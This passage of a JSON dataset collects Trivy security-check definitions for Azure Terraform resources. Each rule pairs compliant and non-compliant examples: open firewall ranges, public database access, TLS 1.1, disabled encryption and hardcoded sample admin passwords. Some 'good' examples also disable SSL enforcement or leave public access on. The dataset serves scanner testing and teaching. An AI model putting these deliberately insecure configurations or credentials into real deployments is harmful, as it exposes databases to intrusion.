        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled\n  good:\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/no_public_access.yaml",
        "local_path": "azure/database/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled"
            ],
            "good": [
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-NO_PUBLIC_FIREWALL_ACCESS",
        "title": "No Public Firewall Access",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address\n  good:\n    - |-\n      resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n        name                = \"good_rule\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_sql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"0.0.0.0\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"api-rg-pro\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                    = \"example-postgre-server\"\n        location                = azurerm_resource_group.example.location\n        resource_group_name     = azurerm_resource_group.example.name\n        sku_name                = \"GP_Gen5_2\"\n        version                 = \"11\"\n        ssl_enforcement_enabled = true\n      }\n\n      resource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n        name                = \"bad_example\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"255.255.255.255\"\n      }\n    - |-\n      resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n        name                = \"bad_rule\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_sql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"255.255.255.255\"\n      }\n\n\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_sql_server\" \"example\" {\n        name                         = \"mysqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"4dm1n157r470r\"\n        administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n      }\n",
        "file_name": "no_public_firewall_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/no_public_firewall_access.yaml",
        "local_path": "azure/database/no_public_firewall_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address"
            ],
            "good": [
              "resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n  name                = \"good_rule\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_sql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"0.0.0.0\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"api-rg-pro\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                    = \"example-postgre-server\"\n  location                = azurerm_resource_group.example.location\n  resource_group_name     = azurerm_resource_group.example.name\n  sku_name                = \"GP_Gen5_2\"\n  version                 = \"11\"\n  ssl_enforcement_enabled = true\n}\n\nresource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n  name                = \"bad_example\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}",
              "resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n  name                = \"bad_rule\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_sql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}\n\n\nresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"example\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_CONNECTION_THROTTLING",
        "title": "Postgres Configuration Connection Throttling",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"connection_throttling\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_connection_throttling.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_connection_throttling.yaml",
        "local_path": "azure/database/postgres_configuration_connection_throttling.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"connection_throttling\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_LOG_CHECKPOINTS",
        "title": "Postgres Configuration Log Checkpoints",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"log_checkpoints\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_log_checkpoints.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_log_checkpoints.yaml",
        "local_path": "azure/database/postgres_configuration_log_checkpoints.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"log_checkpoints\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_LOG_CONNECTIONS",
        "title": "Postgres Configuration Log Connections",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n    - https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"log_connections\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_log_connections.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_log_connections.yaml",
        "local_path": "azure/database/postgres_configuration_log_connections.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration",
              "https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"log_connections\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-RETENTION_PERIOD_SET",
        "title": "Retention Period Set",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days\n  good:\n    - |-\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n      }\n\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n        retention_in_days                       = 90\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n        retention_in_days                       = 6\n      }\n",
        "file_name": "retention_period_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/retention_period_set.yaml",
        "local_path": "azure/database/retention_period_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days"
            ],
            "good": [
              "resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n}\n\nresource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n  retention_in_days                       = 90\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n  retention_in_days                       = 6\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-SECURE_TLS_POLICY",
        "title": "Secure Tls Policy",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced\n  good:\n    - |-\n      resource \"azurerm_mssql_server\" \"good_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"missadministrator\"\n        administrator_login_password = \"thisIsKat11\"\n        minimum_tls_version          = \"1.2\"\n      }\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server\" \"bad_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"missadministrator\"\n        administrator_login_password = \"thisIsKat11\"\n        minimum_tls_version          = \"1.1\"\n      }\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_1\"\n      }\n",
        "file_name": "secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/secure_tls_policy.yaml",
        "local_path": "azure/database/secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced"
            ],
            "good": [
              "resource \"azurerm_mssql_server\" \"good_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"missadministrator\"\n  administrator_login_password = \"thisIsKat11\"\n  minimum_tls_version          = \"1.2\"\n}",
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server\" \"bad_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"missadministrator\"\n  administrator_login_password = \"thisIsKat11\"\n  minimum_tls_version          = \"1.1\"\n}",
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-THREAT_ALERT_EMAIL_SET",
        "title": "Threat Alert Email Set",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        email_addresses = [\"db-security@acme.org\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        email_addresses = []\n      }\n",
        "file_name": "threat_alert_email_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/threat_alert_email_set.yaml",
        "local_path": "azure/database/threat_alert_email_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  email_addresses = [\"db-security@acme.org\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  email_addresses = []\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-THREAT_ALERT_EMAIL_TO_OWNER",
        "title": "Threat Alert Email To Owner",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts            = []\n\n        email_account_admins = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n        ]\n        email_account_admins = false\n      }\n",
        "file_name": "threat_alert_email_to_owner.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/threat_alert_email_to_owner.yaml",
        "local_path": "azure/database/threat_alert_email_to_owner.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts            = []\n\n  email_account_admins = true\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n  ]\n  email_account_admins = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATAFACTORY-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "datafactory",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled\n  good:\n    - |-\n      resource \"azurerm_data_factory\" \"good_example\" {\n        name                   = \"example\"\n        location               = azurerm_resource_group.example.location\n        resource_group_name    = azurerm_resource_group.example.name\n        public_network_enabled = false\n      }\n  bad:\n    - |-\n      resource \"azurerm_data_factory\" \"bad_example\" {\n        name                = \"example\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/datafactory/no_public_access.yaml",
        "local_path": "azure/datafactory/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled"
            ],
            "good": [
              "resource \"azurerm_data_factory\" \"good_example\" {\n  name                   = \"example\"\n  location               = azurerm_resource_group.example.location\n  resource_group_name    = azurerm_resource_group.example.name\n  public_network_enabled = false\n}"
            ],
            "bad": [
              "resource \"azurerm_data_factory\" \"bad_example\" {\n  name                = \"example\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATALAKE-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "azure",
        "service": "datalake",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store\n  good:\n    - |-\n      resource \"azurerm_data_lake_store\" \"good_example\" {\n        encryption_state = \"Enabled\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_data_lake_store\" \"bad_example\" {\n        encryption_state = \"Disabled\"\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/datalake/enable_at_rest_encryption.yaml",
        "local_path": "azure/datalake/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store"
            ],
            "good": [
              "resource \"azurerm_data_lake_store\" \"good_example\" {\n  encryption_state = \"Enabled\"\n}"
            ],
